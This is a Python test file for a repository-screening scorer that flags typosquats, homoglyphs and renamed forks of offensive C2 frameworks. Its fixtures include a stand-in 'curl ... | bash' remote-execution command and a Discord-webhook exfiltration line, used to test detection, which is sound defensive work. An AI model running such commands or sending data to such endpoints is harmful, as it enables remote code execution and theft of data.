"""Offline tests for Tier-1 screening (pure scorer)."""

from __future__ import annotations

from git_warden.scanning.screening import DEFAULT_TIER2_THRESHOLD, score_repo

KNOWN = ["Sliver", "sliver", "Cobalt Strike", "Mythic", "Havoc"]


def test_typosquat_name_is_strong_signal():
    # "shiver" is edit-distance 1 from "sliver".
    res = score_repo(name="shiver", full_name="x/shiver", known_terms=KNOWN, readme="legit tool")
    assert any(s.startswith("typosquat-of:") for s in res.signal_names)


def test_wrapped_tool_name_plus_malicious_token_promotes():
    res = score_repo(
        name="malware-sliver",
        full_name="investlab/malware-sliver",
        known_terms=KNOWN,
        readme="A normal looking readme that is reasonably long to avoid minimal flag.",
    )
    names = res.signal_names
    assert any(s.startswith("wraps-known-tool:") for s in names)
    assert any(s.startswith("malicious-name-token:") for s in names)
    assert res.tier2  # 2 + 2 >= threshold


def test_readme_exfil_indicator_is_strong():
    readme = "Send results to https://discord.com/api/webhooks/123/abc for collection."
    res = score_repo(name="helper", full_name="x/helper", known_terms=KNOWN, readme=readme)
    assert "readme-exfil-indicator" in res.signal_names


def test_readme_remote_exec_detected():
    readme = "Install: curl http://evil.example/x.sh | bash"
    res = score_repo(name="setup", full_name="x/setup", known_terms=KNOWN, readme=readme)
    assert "readme-remote-exec" in res.signal_names


def test_bland_name_long_clean_readme_does_not_promote():
    # The anti-noise guard: an innocuous repo must NOT be promoted to Tier-2.
    readme = "A small utility library for formatting dates. MIT licensed. " * 5
    res = score_repo(name="date-utils", full_name="acme/date-utils", known_terms=KNOWN,
                     readme=readme)
    assert res.score == 0
    assert not res.tier2


def test_named_renamed_fork_alone_is_not_enough():
    # A fork that KEEPS the tool name (e.g. quick-sliver) and adds nothing else
    # must not auto-clone; this is the de-noising guard against benign forks.
    res = score_repo(name="quick-sliver", full_name="someone/quick-sliver", known_terms=KNOWN,
                     readme="reasonably long readme describing a c2 framework project here.",
                     renamed_fork=True)
    assert "renamed-fork-of-pinned" in res.signal_names
    assert not any(s.startswith("wraps-known-tool") for s in res.signal_names)  # not double-counted
    assert res.score < DEFAULT_TIER2_THRESHOLD
    assert not res.tier2


def test_lineage_obscured_rename_promotes():
    # A fork renamed to drop the tool name entirely is hiding its origin.
    res = score_repo(name="PamperoC2", full_name="Joapath/PamperoC2", known_terms=KNOWN,
                     readme="reasonably long readme describing a c2 framework project here.",
                     renamed_fork=True)
    assert "lineage-obscured-rename" in res.signal_names
    assert res.tier2  # lineage-obscured (2) + renamed-fork (2) >= 4


def test_renamed_fork_plus_obfuscated_readme_promotes():
    readme = "payload: " + "QQQQ" * 40  # long base64-ish blob -> obfuscation signal
    res = score_repo(name="quick-sliver", full_name="someone/quick-sliver", known_terms=KNOWN,
                     readme=readme, renamed_fork=True)
    assert res.tier2  # renamed-fork (2) + obfuscation (2) >= 4


def test_homoglyph_impersonation_detected():
    # eval #7: Cyrillic 'ѕ' (U+0455) lookalike of Latin 's' -> homoglyph of Sliver.
    res = score_repo(name="ѕliver", full_name="x/ѕliver", known_terms=KNOWN,
                     readme="a normal readme long enough to avoid the minimal flag here.")
    assert any(s.startswith("homoglyph-of:") for s in res.signal_names)
